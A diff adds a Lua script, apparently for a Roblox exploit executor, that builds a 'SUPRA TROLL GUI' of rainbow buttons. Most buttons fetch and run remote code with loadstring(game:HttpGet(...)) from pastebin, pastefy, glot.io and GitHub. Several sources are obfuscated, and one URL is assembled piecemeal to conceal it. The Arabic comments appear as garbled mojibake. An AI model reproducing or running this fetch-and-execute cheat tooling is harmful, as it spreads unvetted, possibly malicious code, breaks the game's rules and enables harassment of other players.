@@ -1,0 +1,200 @@
+ -- ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù…Ø³ØªØ­Ø¯Ø«Ø© ÙˆØ§Ù„Ù…Ø­Ø³Ù†Ø©
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local UICorner = Instance.new("UICorner")
+local UIGridLayout = Instance.new("UIGridLayout")
+local Title = Instance.new("TextLabel")
+local Shadow = Instance.new("ImageLabel")
+local ToggleButton = Instance.new("TextButton")
+
+-- Ø®ØµØ§Ø¦Øµ ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Ø§Ù„Ø¸Ù„
+Shadow.Name = "Shadow"
+Shadow.Parent = MainFrame
+Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+Shadow.BackgroundTransparency = 1
+Shadow.Position = UDim2.new(0.5, 0, 0.5, 10)
+Shadow.Size = UDim2.new(1, 30, 1, 30)
+Shadow.Image = "rbxassetid://1316045217"
+Shadow.ImageTransparency = 0.5
+Shadow.ZIndex = -1
+
+-- Ø§Ù„Ø¥Ø·Ø§Ø± Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.Size = UDim2.new(0, 350, 0, 450)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -225)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+-- Ø²ÙˆØ§ÙŠØ§ Ù…Ù†Ø­Ù†ÙŠØ© Ù„Ù„Ø¥Ø·Ø§Ø± Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
+UICorner.CornerRadius = UDim.new(0, 15)
+UICorner.Parent = MainFrame
+
+-- Ø§Ù„Ø¹Ù†ÙˆØ§Ù†
+Title.Parent = MainFrame
+Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Title.Size = UDim2.new(1, -10, 0, 50)
+Title.Font = Enum.Font.SourceSansBold
+Title.Text = "XXX SUPRA TROLL GUI"
+Title.TextColor3 = Color3.fromRGB(139, 0, 0)
+Title.TextSize = 30.0
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.new(0, 5, 0, 5)
+Title.TextStrokeTransparency = 0.8
+
+-- Ø²Ø± Ø§Ù„ØªØ¨Ø¯ÙŠÙ„
+ToggleButton.Parent = ScreenGui
+ToggleButton.Size = UDim2.new(0, 50, 0, 50)
+ToggleButton.Position = UDim2.new(1, -60, 1, -60)
+ToggleButton.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+ToggleButton.Text = ""
+ToggleButton.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
+end)
+
+-- Ø¥Ø·Ø§Ø± Ø§Ù„ØªÙ…Ø±ÙŠØ±
+ScrollingFrame.Parent = MainFrame
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+ScrollingFrame.BackgroundTransparency = 0.8
+ScrollingFrame.Size = UDim2.new(1, -10, 1, -60)
+ScrollingFrame.Position = UDim2.new(0, 5, 0, 55)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 1500)
+ScrollingFrame.ScrollBarThickness = 8
+ScrollingFrame.BorderSizePixel = 0
+
+-- ØªØ®Ø·ÙŠØ· Ø§Ù„Ø´Ø¨ÙƒØ©
+UIGridLayout.Parent = ScrollingFrame
+UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.CellSize = UDim2.new(0.5, -10, 0, 50)
+UIGridLayout.CellPadding = UDim2.new(0, 5, 0, 5)
+
+-- ÙˆØ¸ÙŠÙØ© Ù„Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø£Ø²Ø±Ø§Ø±
+local function createRainbowButton(text, callback)
+    local Button = Instance.new("TextButton")
+    Button.Parent = ScrollingFrame
+    Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Button.Size = UDim2.new(0.5, -20, 0, 50)
+    Button.Font = Enum.Font.SourceSansBold
+    Button.Text = text
+    Button.TextColor3 = Color3.fromRGB(139, 0, 0)
+    Button.TextSize = 20.0
+    Button.BackgroundTransparency = 1
+
+    -- Ø²ÙˆØ§ÙŠØ§ Ù…Ù†Ø­Ù†ÙŠØ© Ù„Ù„Ø£Ø²Ø±Ø§Ø±
+    local ButtonCorner = Instance.new("UICorner")
+    ButtonCorner.CornerRadius = UDim.new(0, 10)
+    ButtonCorner.Parent = Button
+
+    -- ØªØ£Ø«ÙŠØ± Ø§Ù„Ø¥Ø¶Ø§Ø¡Ø© Ø§Ù„Ø³Ø§Ø·Ø¹Ø©
+    local Light = Instance.new("UIStroke")
+    Light.Parent = Button
+    Light.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    Light.Color = Color3.fromRGB(0, 0, 139)
+    Light.Thickness = 2
+
+    spawn(function()
+        while true do
+            for i = 0, 255, 5 do
+                Button.BackgroundColor3 = Color3.fromHSV(i/255, 1, 1)
+                wait(0.05)
+            end
+        end
+    end)
+
+    Button.MouseButton1Click:Connect(callback)
+end
+
+-- Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ø¨Ø§Ù„Ù…Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©
+createRainbowButton("Sad Boy😹", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/hgPJbwF0"))()
+end)
+
+createRainbowButton("snail😰", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_vZDX8j5ggfAf58QhdJ59BVEmF6nmZgq4Mcjt2l8wn16CiStIW2P6EkNc605qv9K4.lua.txt'))()
+end)
+
+createRainbowButton("Glios ☠️", function()
+    writefile(".nonecing", "white")
+loadstring(game:HttpGet(('https://glot.io/snippets/gua2ntmbdm/raw/main.lua'),true))()
+end)
+
+createRainbowButton("CADUCEUS ☠️❌", function()
+    loadstring(game:HttpGet("https://pastefy.app/awJrO3Q5/raw"))()
+end)
+
+createRainbowButton("The Boss😡", function()
+    loadstring(game:HttpGet("https://pastefy.app/ZWgckZdU/raw"))()
+end)
+
+createRainbowButton("Zombie 😰", function()
+    loadstring(game:HttpGet(('https://pastefy.app/w7KnPY70/raw'),true))()
+end)
+
+createRainbowButton("Dino walk 😹", function()
+ loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+end)
+
+createRainbowButton("Jacki chan😰", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/XPGSMEw9"))();
+    loadstring(game:HttpGet("https://Pastebin.com/raw/gcjxDzhY"))()
+end)
+
+createRainbowButton("motorcycle 😹", function()
+    loadstring(game:HttpGet(('https://pastefy.app/7LO0ZbrN/raw'),true))()
+end)
+
+createRainbowButton("Boy on moon gravity☠️", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cortzalno666/NectoVerse-Industries-Data/master/Scripts%20Folder/Honored.lua'),true))()
+end)
+
+createRainbowButton("Ink Monster😰", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_f4i3ntKS5B8tK9zpCAnr31Dp7RNSYOo20gpln1fs1h2U4yjXNdNk6lFqZvN1Ft2p.lua.txt"))()
+end)
+
+createRainbowButton("Clones😡", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt"))()
+end)
+
+createRainbowButton("Only Head😹", function()
+    loadstring(game:HttpGet("https://pastefy.app/Dz3ZNKE8/raw"))()
+end)
+
+createRainbowButton("Hunter😰", function()
+    getgenv().chatgame = "play" --chat kill notification
+
+loadstring(game:HttpGet(('https://pastefy.app/KYs0sftX/raw'),true))()
+end)
+
+createRainbowButton("Parkour😹", function()
+    loadstring(game:HttpGet("https://pastefy.app/wyfpLe2E/raw"))()
+end)
+
+createRainbowButton("Rochips☠️❌❌", function()
+    if "Rochips Loader" then
+	local Rochips_panel,v,u,i=loadstring,"/snippets","gwwv","/raw/main.lua" ;
+	Rochips_panel(game:HttpGet("https://glot.io"..v.."/" ..u.."877ga3"..i))();
+	return "it will load in around 3 - 131 seconds"
+end
+end)
+
+createRainbowButton("Keyboard 😰", function()
+    loadstring(game:HttpGet(('https://pastefy.app/Te4dwSw2/raw'),true))()
+end)
+
+createRainbowButton("Credits To :", function()  
+  
+end)
+
+createRainbowButton("يورغو😈", function()
+    
+end)
+
+createRainbowButton("الونيس😹", function()
+    
+end)
